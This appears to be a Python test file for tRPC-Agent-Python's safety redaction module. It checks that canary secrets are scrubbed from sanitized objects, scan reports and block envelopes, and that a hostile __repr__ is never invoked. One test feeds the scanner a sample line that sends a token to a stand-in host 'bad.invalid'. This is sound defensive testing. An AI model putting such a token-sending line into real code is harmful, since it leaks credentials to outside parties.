# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Recursive sanitizer, malicious repr, report canary, and hash tests."""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum
from pathlib import Path

from pydantic import BaseModel

from trpc_agent_sdk.safety import SafetyScanRequest
from trpc_agent_sdk.safety import SafetyFinding
from trpc_agent_sdk.safety import SafetyRule
from trpc_agent_sdk.safety import SafetyCategory
from trpc_agent_sdk.safety import RiskLevel
from trpc_agent_sdk.safety._redaction import CYCLE
from trpc_agent_sdk.safety._redaction import REDACTED
from trpc_agent_sdk.safety._redaction import sanitize
from trpc_agent_sdk.safety._redaction import sha256_text
from trpc_agent_sdk.safety._tool_filter import blocked_envelope

from .conftest import CANARY


class SampleEnum(str, Enum):
    VALUE = "value"


class SampleModel(BaseModel):
    token: str
    value: int


@dataclass
class SampleData:
    cookie: str
    path: Path


class MaliciousRepr:
    called = False

    def __repr__(self):
        self.called = True
        raise RuntimeError(CANARY)

    def __str__(self):
        self.called = True
        raise RuntimeError(CANARY)


class CanaryRule(SafetyRule):
    rule_id = "TEST.CANARY"

    def evaluate(self, context, policy):
        del context, policy
        return (SafetyFinding(
            rule_id=self.rule_id,
            category=SafetyCategory.SECRET,
            risk_level=RiskLevel.HIGH,
            message=CANARY,
            evidence=CANARY,
            recommendation=CANARY,
            redacted=False,
        ), )


def test_recursive_controlled_types_are_bounded_and_redacted():
    value = {
        "Authorization": f"Bearer {CANARY}",
        "items": [SampleModel(token=CANARY, value=1),
                  SampleData(cookie=CANARY, path=Path("workspace/x"))],
        "bytes": CANARY.encode(),
        "enum": SampleEnum.VALUE,
        "exception": RuntimeError(CANARY),
        "set": {1, 2},
    }
    result = sanitize(value)
    assert CANARY not in str(result)
    assert result["Authorization"] == REDACTED
    assert result["items"][0]["token"] == REDACTED
    assert result["items"][1]["cookie"] == REDACTED
    assert result["enum"] == "value"


def test_cycles_and_container_string_depth_limits():
    value: list[object] = []
    value.append(value)
    assert sanitize(value)[0] == CYCLE
    assert "<truncated>" in str(sanitize(["x" * 100, 2, 3], max_items=2, max_string=8))
    nested = {"a": {"b": {"c": "value"}}}
    assert "<truncated>" in str(sanitize(nested, max_depth=2))


def test_unknown_object_does_not_invoke_malicious_repr():
    value = MaliciousRepr()
    assert sanitize(value) == "<unsupported>"
    assert not value.called


def test_report_and_block_envelope_never_contain_raw_canary(scanner):
    source = f"import requests\nrequests.get('https://bad.invalid?token={CANARY}')"
    report = scanner.scan(SafetyScanRequest(script=source, language="python"))
    assert CANARY not in report.model_dump_json()
    assert CANARY not in str(blocked_envelope(report))
    assert report.script_hash == sha256_text(source)


def test_custom_rule_text_is_redacted_before_public_report():
    from trpc_agent_sdk.safety import SafetyScanner

    report = SafetyScanner(rules=[CanaryRule()]).scan(SafetyScanRequest(script="value = 1", language="python"))
    assert CANARY not in report.model_dump_json()
    assert report.findings[0].redacted


def test_request_labels_and_policy_version_are_redacted_in_report():
    from trpc_agent_sdk.safety import SafetyPolicy
    from trpc_agent_sdk.safety import SafetyScanner

    report = SafetyScanner(SafetyPolicy(schema_version="1", policy_version=CANARY)).scan(
        SafetyScanRequest(
            script="value = 1",
            language="python",
            tool_name=CANARY,
            source_type=CANARY,
        ))
    assert CANARY not in report.model_dump_json()


def test_sha256_is_deterministic_and_not_plaintext():
    assert sha256_text(CANARY) == sha256_text(CANARY)
    assert len(sha256_text(CANARY)) == 64
    assert CANARY not in sha256_text(CANARY)
